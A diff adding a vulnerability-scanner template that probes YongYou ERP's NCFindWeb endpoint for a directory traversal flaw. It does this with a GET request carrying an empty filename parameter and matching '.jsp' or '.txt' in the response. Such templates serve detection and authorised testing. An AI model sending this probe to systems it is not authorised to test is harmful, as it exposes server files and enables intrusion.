@@ -1,0 +1,25 @@
+id: YongYou-ERP(Directory_traversal)
+
+info:
+  name: YongYou-ERP(Directory_traversal)
+  author: wintrysec
+  severity: critical
+  description: 用友ERP目录遍历
+  reference: https://github.com/DawnFlame/POChouse
+  tags: YongYou
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename="
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - ".jsp"
+          - ".txt"
+        condition: or
+      - type: status
+        status:
+          - 200
